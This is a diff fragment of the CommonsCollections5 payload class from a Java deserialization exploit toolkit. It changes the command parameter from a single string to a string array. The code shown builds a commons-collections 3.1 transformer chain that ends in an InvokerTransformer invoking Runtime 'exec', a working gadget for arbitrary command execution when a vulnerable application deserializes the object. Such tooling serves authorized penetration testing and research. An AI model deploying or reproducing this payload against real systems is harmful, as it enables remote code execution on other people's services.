@@ -54,10 +54,9 @@ https://github.com/JetBrains/jdk8u_jdk/commit/af2361ee2878302012214299036b3a8b4e
 @PayloadTest ( precondition = "isApplicableJavaVersion")
 @Dependencies({"commons-collections:commons-collections:3.1"})
 @Authors({ Authors.MATTHIASKAISER, Authors.JASINNER })
-public class CommonsCollections5 extends PayloadRunner implements ObjectPayload<BadAttributeValueExpException> {
+public class CommonsCollections5 extends ExtendedObjectPayload<BadAttributeValueExpException> {
 
-	public BadAttributeValueExpException getObject(final String command) throws Exception {
-		final String[] execArgs = new String[] { command };
+	public BadAttributeValueExpException getObject(final String[] command) throws Exception {
 		// inert chain for setup
 		final Transformer transformerChain = new ChainedTransformer(
 		        new Transformer[]{ new ConstantTransformer(1) });
@@ -71,7 +70,7 @@ public class CommonsCollections5 extends PayloadRunner implements ObjectPayload<
 					Object.class, Object[].class }, new Object[] {
 					null, new Object[0] }),
 				new InvokerTransformer("exec",
-					new Class[] { String.class }, execArgs),
+					new Class[] { String[].class }, new Object[] { command }),
 				new ConstantTransformer(1) };
 
 		final Map innerMap = new HashMap();
